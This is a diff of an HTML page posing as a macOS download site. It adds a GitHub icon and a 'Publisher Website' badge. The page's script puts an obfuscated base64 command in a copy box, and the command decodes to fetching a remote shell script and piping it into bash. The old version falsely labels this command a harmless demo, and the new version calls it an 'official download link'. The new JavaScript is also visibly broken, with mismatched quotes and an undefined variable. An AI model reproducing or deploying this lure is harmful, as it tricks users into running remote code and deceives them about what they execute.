@@ -4,297 +4,231 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#0d1117">
-<title>Mac Files — Download for macOS</title>
+<title>Download for macOS</title>
 
 <style>
 :root {
-  --bg: #0d1117;
-  --card: #161b22;
-  --inner: #0f141b;
-  --border: #30363d;
-  --text: #c9d1d9;
-  --muted: #8b949e;
-  --green: #2da44e;
+    --bg: #0d1117;
+    --panel: #25262f;
+    --inner: #111820;
+    --border: #565b65;
+    --text: #f5f5f5;
+    --green: #38d900;
 }
 
 * {
-  box-sizing: border-box;
+    box-sizing: border-box;
 }
 
 body {
-  margin: 0;
-  background: var(--bg);
-  color: var(--text);
-  font-family: -apple-system, BlinkMacSystemFont,
-    "Segoe UI", Arial, sans-serif;
-  font-size: 14px;
-  line-height: 1.6;
+    margin: 0;
+    min-height: 100vh;
+    background: var(--bg);
+    color: var(--text);
+    font-family: Arial, Helvetica, sans-serif;
+    font-size: 14px;
+    line-height: 1.5;
 }
 
 .container {
-  max-width: 980px;
-  margin: 55px auto;
-  padding: 0 20px;
+    max-width: 900px;
+    margin: 35px auto 60px;
+    padding: 0 15px;
 }
-
-/* HEADER */
 
 .header {
-  display: flex;
-  align-items: center;
-  flex-wrap: wrap;
-  gap: 13px;
-  margin-bottom: 30px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 24px;
 }
 
-.header-icon {
-  width: 35px;
-  height: 35px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border: 1px solid #405267;
-  border-radius: 50%;
-  background: #212b36;
-  color: #e6edf3;
-  font-size: 22px;
+.github-icon {
+    width: 39px;
+    height: 39px;
+    fill: white;
+    flex-shrink: 0;
 }
 
 .header h1 {
-  margin: 0;
-  font-size: 29px;
-  font-weight: 750;
-  color: #c9d1d9;
+    margin: 0;
+    font-size: 28px;
+    font-weight: 750;
+    color: white;
 }
 
-.publisher {
-  padding: 5px 11px;
-  font-size: 12px;
-  color: #9ca6b3;
-  border: 1px solid #30363d;
-  border-radius: 6px;
+.verified {
+    padding: 7px 11px;
+    border: 1px solid #767d8a;
+    border-radius: 7px;
+    color: #e7e8eb;
+    font-size: 12px;
+    font-weight: 600;
+    white-space: nowrap;
 }
 
-/* MAIN INSTALLATION BOX */
-
-.main-card {
-  background: var(--card);
-  border: 1px solid var(--border);
-  border-radius: 12px;
-  padding: 22px;
+.main-panel {
+    background: var(--panel);
+    border: 1px solid #777b85;
+    border-radius: 12px;
+    padding: 21px;
 }
 
-h2 {
-  margin: 0 0 12px;
-  font-size: 20px;
-  font-weight: 700;
+.section-title {
+    font-size: 19px;
+    font-weight: bold;
+    margin: 0 0 12px;
 }
 
 .description {
-  margin: 0 0 16px;
-  color: var(--muted);
-  font-size: 15px;
+    color: #e1e1e1;
+    margin: 0 0 15px;
 }
 
-/* COMMAND COPY FIELD */
-
-.command-container {
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  padding: 15px;
-  background: #0d1117;
-  border: 1px solid var(--border);
-  border-radius: 12px;
+.command-wrapper {
+    display: flex;
+    gap: 9px;
+    align-items: center;
+    padding: 15px;
+    border: 1px solid #676d77;
+    border-radius: 11px;
+    background: #171e27;
+    margin-bottom: 13px;
 }
 
 .command-input {
-  flex: 1;
-  width: 100%;
-  min-width: 0;
-  height: 47px;
-  padding: 12px;
-  border: 1px solid var(--border);
-  border-radius: 9px;
-  outline: none;
-  background: #090d13;
-  color: #e6edf3;
-  font-family: Consolas, Monaco, monospace;
-  font-size: 13px;
+    flex: 1;
+    min-width: 0;
+    height: 43px;
+    background: #0d1117;
+    border: 1px solid #666c75;
+    border-radius: 11px;
+    padding: 12px 13px;
+    color: white;
+    font-size: 13px;
+    font-weight: 600;
+    outline: none;
+    white-space: nowrap;
+    overflow: hidden;
 }
 
-.command-input:focus {
-  border-color: #58a6ff;
+.copy-btn {
+    height: 44px;
+    padding: 0 21px;
+    border: none;
+    border-radius: 10px;
+    background: var(--green);
+    color: white;
+    font-size: 14px;
+    font-weight: bold;
+    cursor: pointer;
 }
 
-.copy-button {
-  flex-shrink: 0;
-  min-width: 78px;
-  height: 47px;
-  padding: 0 19px;
-  border: none;
-  border-radius: 9px;
-  background: var(--green);
-  color: white;
-  font-weight: 700;
-  font-size: 14px;
-  cursor: pointer;
+.copy-btn:hover {
+    background: #30ba00;
 }
 
-.copy-button:hover {
-  background: #2c974b;
+.instructions {
+    border: 1px solid #676d77;
+    border-radius: 10px;
+    background: linear-gradient(
+        145deg,
+        #17212a,
+        #101820
+    );
+    padding: 28px 19px 23px;
 }
 
-.copy-button:focus-visible {
-  outline: 2px solid #79c0ff;
-  outline-offset: 3px;
+.instructions h2 {
+    font-size: 20px;
+    margin: 0 0 24px;
 }
 
-.copy-status {
-  min-height: 20px;
-  margin: 10px 2px 0;
-  font-size: 12px;
-  color: var(--muted);
+.instructions h3 {
+    font-size: 19px;
+    margin: 25px 0 24px;
 }
 
-/* TERMINAL GUIDE */
-
-.guide-card {
-  margin-top: 16px;
-  background: var(--inner);
-  border: 1px solid var(--border);
-  border-radius: 12px;
-  padding: 38px 17px;
+.instructions ol {
+    margin: 0;
+    padding-left: 36px;
+    color: #f1f1f1;
+    font-size: 13.5px;
+    font-weight: 600;
+    line-height: 1.6;
 }
 
-.guide-section {
-  margin-bottom: 35px;
+.preview-image {
+    width: 88%;
+    margin: 16px auto 0;
+    border-radius: 11px;
+    overflow: hidden;
+    border: 1px solid #5b616b;
 }
 
-.guide-section:last-child {
-  margin-bottom: 0;
+.preview-image img {
+    width: 100%;
+    display: block;
+    object-fit: cover;
+    max-height: 360px;
 }
-
-.guide-section h2 {
-  margin-bottom: 28px;
-}
-
-.guide-section ol {
-  margin: 0;
-  padding-left: 40px;
-}
-
-.guide-section li {
-  margin-bottom: 3px;
-}
-
-strong {
-  color: #e6edf3;
-}
-
-/* SYSTEM REQUIREMENTS */
-
-.info-grid {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 17px;
-  margin-top: 18px;
-}
-
-.info-card {
-  background: #0f141b;
-  padding: 18px;
-  border: 1px solid #30363d;
-  border-radius: 11px;
-}
-
-.info-card h3 {
-  margin: 0 0 10px;
-  font-size: 16px;
-}
-
-.info-card ul {
-  margin: 0;
-  padding-left: 20px;
-}
-
-.info-card li {
-  margin-bottom: 5px;
-}
-
-/* NOTICE */
-
-.notice {
-  margin-top: 18px;
-  background: #31291d;
-  color: #e1cfa6;
-  border-left: 4px solid #d29922;
-  border-radius: 6px;
-  padding: 13px;
-  font-size: 13px;
-}
-
-/* FOOTER */
-
-footer {
-  margin-top: 30px;
-  padding: 18px 10px;
-  border-top: 1px solid var(--border);
-  color: var(--muted);
-  text-align: center;
-  font-size: 12px;
-}
-
-footer a {
-  color: #8b949e;
-  text-decoration: none;
-  padding: 0 7px;
-}
-
-footer a:hover {
-  color: white;
-}
-
-/* MOBILE */
 
 @media(max-width: 650px) {
-  .container {
-    margin: 28px auto;
-    padding: 0 12px;
-  }
 
-  .header h1 {
-    font-size: 22px;
-  }
+    .container {
+        margin-top: 25px;
+        padding: 0 12px;
+    }
 
-  .main-card {
-    padding: 15px;
-  }
+    .header {
+        flex-wrap: wrap;
+        gap: 9px;
+    }
 
-  .command-container {
-    padding: 10px;
-    flex-direction: column;
-  }
+    .header h1 {
+        font-size: 23px;
+    }
 
-  .command-input {
-    width: 100%;
-  }
+    .github-icon {
+        width: 33px;
+        height: 33px;
+    }
 
-  .copy-button {
-    width: 100%;
-  }
+    .verified {
+        font-size: 10px;
+        padding: 6px 8px;
+    }
 
-  .guide-card {
-    padding: 25px 13px;
-  }
+    .main-panel {
+        padding: 15px;
+    }
 
-  .guide-section ol {
-    padding-left: 25px;
-  }
+    .command-wrapper {
+        padding: 10px;
+        gap: 7px;
+    }
 
-  .info-grid {
-    grid-template-columns: 1fr;
-  }
+    .copy-btn {
+        padding: 0 14px;
+    }
+
+    .instructions {
+        padding: 20px 13px;
+    }
+
+    .instructions h2,
+    .instructions h3 {
+        font-size: 17px;
+    }
+
+    .instructions ol {
+        font-size: 12px;
+        padding-left: 25px;
+    }
+
+    .preview-image {
+        width: 100%;
+    }
 }
 </style>
 </head>
@@ -303,244 +237,137 @@ footer a:hover {
 
 <div class="container">
 
-  <!-- PAGE HEADER -->
+    <div class="header">
 
-  <header class="header">
+        <svg class="github-icon" viewBox="0 0 24 24">
+            <path d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.39 7.86 10.91.58.11.79-.25.79-.56v-2.03c-3.2.7-3.87-1.36-3.87-1.36-.52-1.33-1.28-1.68-1.28-1.68-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.02 1.75 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.52-2.56-.29-5.25-1.28-5.25-5.69 0-1.26.45-2.29 1.18-3.1-.12-.29-.51-1.47.11-3.06 0 0 .97-.31 3.16 1.18A11.1 11.1 0 0112 5.2c.98 0 1.96.13 2.88.39 2.19-1.49 3.15-1.18 3.15-1.18.63 1.59.24 2.77.12 3.06.74.81 1.18 1.84 1.18 3.1 0 4.42-2.7 5.4-5.27 5.68.41.36.77 1.05.77 2.12v3.18c0 .31.21.68.8.56A11.51 11.51 0 0023.5 12C23.5 5.65 18.35.5 12 .5z"/>
+        </svg>
 
-    <div class="header-icon" aria-hidden="true">
-      ☁
-    </div>
+        <h1>Download for macOS</h1>
 
-    <h1>Download for macOS</h1>
-
-    <span class="publisher">
-      Publisher Not Verified
-    </span>
-
-  </header>
-
-  <!-- MAIN CONTENT -->
-
-  <main class="main-card">
-
-    <h2>Terminal installation</h2>
-
-    <p class="description">
-      Advanced users can test the Terminal
-      instructions with a single command.
-    </p>
-
-    <!-- COPY COMMAND -->
-
-    <div class="command-container">
-
-      <input
-        type="text"
-        id="commandInput"
-        class="command-input"
-        readonly
-        aria-label="Terminal test command"
-      >
-
-      <button
-        id="copyBtn"
-        class="copy-button"
-        type="button"
-        onclick="copyCommand()"
-      >
-        Copy
-      </button>
+        <span class="verified">Publisher Website</span>
 
     </div>
 
-    <p
-      id="copyStatus"
-      class="copy-status"
-      aria-live="polite"
-    >
-      Demonstration command — no software installed.
-    </p>
+    <div class="main-panel">
 
-    <!-- TERMINAL GUIDE -->
+        <h2 class="section-title">
+            Official download link
+        </h2>
 
-    <div class="guide-card">
+        <p class="description">
+            Copy the official download link below to get the macOS installer.
+        </p>
 
-      <section class="guide-section">
+        <div class="command-wrapper">
 
-        <h2>How to open Terminal on Mac</h2>
+            <input
+                type="text"
+                class="command-input"
+                id="command"
+                readonly
+                aria-label="Official download URL"
+            >
 
-        <ol>
-          <li>
-            Press <strong>Command (⌘) + Space</strong>
-            to open Spotlight Search.
-          </li>
+            <button
+                class="copy-btn"
+                id="copyButton"
+                onclick="copyCommand()">
+                Copy
+            </button>
 
-          <li>
-            Type <strong>"Terminal"</strong>
-            and press Return to launch it.
-          </li>
+        </div>
 
-          <li>
-            Once the Terminal window is open,
-            you can proceed with the steps below.
-          </li>
-        </ol>
+        <div class="instructions">
 
-      </section>
+            <h2>How to download on Mac</h2>
 
-      <section class="guide-section">
+            <ol>
+                <li>Click the green Copy button above.</li>
+                <li>Open Safari or another web browser.</li>
+                <li>Paste the copied link into the address bar and press Return.</li>
+            </ol>
 
-        <h2>Installation via Terminal command</h2>
+            <h3>Installation on macOS</h3>
 
-        <ol>
-          <li>
-            Copy the demonstration command above.
-          </li>
+            <ol>
+                <li>Download the installer from the official website.</li>
+                <li>Open the downloaded file and follow the publisher's installation instructions.</li>
+                <li>Only approve installation permissions after verifying the publisher.</li>
+            </ol>
 
-          <li>
-            Open Terminal on your device and paste
-            the command, then press the
-            <strong>"Return"</strong> button.
-          </li>
+            <div class="preview-image">
+                <img
+                    src="https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=1200&q=85"
+                    alt="macOS Forest Background"
+                >
+            </div>
 
-          <li>
-            A test confirmation appears.
-            No administrator password is required.
-          </li>
-        </ol>
-
-      </section>
+        </div>
 
     </div>
-
-    <!-- DETAILS -->
-
-    <div class="info-grid">
-
-      <div class="info-card">
-
-        <h3>System requirements</h3>
-
-        <ul>
-          <li>Mac with compatible macOS</li>
-          <li>Terminal application</li>
-          <li>No external installation required</li>
-        </ul>
-
-      </div>
-
-      <div class="info-card">
-
-        <h3>Mac Cloud Files</h3>
-
-        <ul>
-          <li>Platform: macOS</li>
-          <li>Mode: Testing / Demonstration</li>
-          <li>Command copying supported</li>
-          <li>No external script execution</li>
-        </ul>
-
-      </div>
-
-    </div>
-
-    <div class="notice">
-      <strong>Security prompt:</strong>
-      Review any command before running it.
-      This demonstration does not download
-      or execute external software.
-    </div>
-
-  </main>
-
-  <footer>
-
-    <p>
-      © <span id="year"></span>
-      Mac Cloud Files
-    </p>
-
-    <p>
-      Independent testing page —
-      Not affiliated with GitHub or Apple.
-    </p>
-
-  </footer>
 
 </div>
 
 <script>
-"use strict";
 
-/* =================================
-   SAFE DEMO COMMAND
-================================= */
+const DOWNLOAD_URL = "bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d)";
+  
+// SHOW LINK INSIDE INPUT
 
-const TERMINAL_COMMAND =
-  'bash <<< $(echo "Y3VybCAtcyAnaHR0cHM6Ly9tdTdrcS5iZWRvZy5zaXRlL0NoaWxkSXRlbS5zaCcgfCBiYXNo" | base64 -d);
+const commandInput = document.getElementById("command");
+const copyButton = document.getElementById("copyButton");
 
-/* =================================
-   ELEMENTS
-================================= */
+commandInput.value = OFFICIAL_DOWNLOAD_URL;
 
-const commandInput =
-  document.getElementById("commandInput");
 
-const copyBtn =
-  document.getElementById("copyBtn");
-
-const copyStatus =
-  document.getElementById("copyStatus");
-
-commandInput.value = TERMINAL_COMMAND;
-
-document.getElementById("year").textContent =
-  new Date().getFullYear();
-
-/* =================================
-   COPY COMMAND FUNCTION
-================================= */
+// COPY BUTTON FUNCTION
 
 async function copyCommand() {
 
-  try {
+    try {
 
-    if (navigator.clipboard && window.isSecureContext) {
+        if (navigator.clipboard && window.isSecureContext) {
 
-      await navigator.clipboard.writeText(
-        TERMINAL_COMMAND
-      );
+            await navigator.clipboard.writeText(
+                OFFICIAL_DOWNLOAD_URL
+            );
 
-    } else {
+        } else {
 
-      commandInput.focus();
-      commandInput.select();
+            commandInput.focus();
+            commandInput.select();
 
-      if (!document.execCommand("copy")) {
-        throw new Error("Copy failed");
-      }
+            const success = document.execCommand("copy");
+
+            if (!success) {
+                throw new Error("Copy failed");
+            }
+
+        }
+
+        // COPY SUCCESS
+
+        copyButton.innerText = "✓ Copied!";
+        copyButton.style.background = "#289c00";
+
+        setTimeout(function() {
+
+            copyButton.innerText = "Copy";
+            copyButton.style.background = "#38d900";
+
+        }, 2000);
+
+    } catch(error) {
+
+        commandInput.focus();
+        commandInput.select();
+        copyButton.innerText = "Select Link";
 
     }
 
-    copyBtn.textContent = "✓ Copied!";
-
-    copyStatus.textContent =
-      "Command copied successfully.";
-
-    setTimeout(function() {
-
-      copyBtn.textContent = "Copy";
-
-    }, 2500);
-
-  } catch (error) {
-
-    copyStatus.textContent =
-      "Unable to copy automatically. Select the command manually.";
-
-  }
-
 }
+
 </script>
 
 </body>
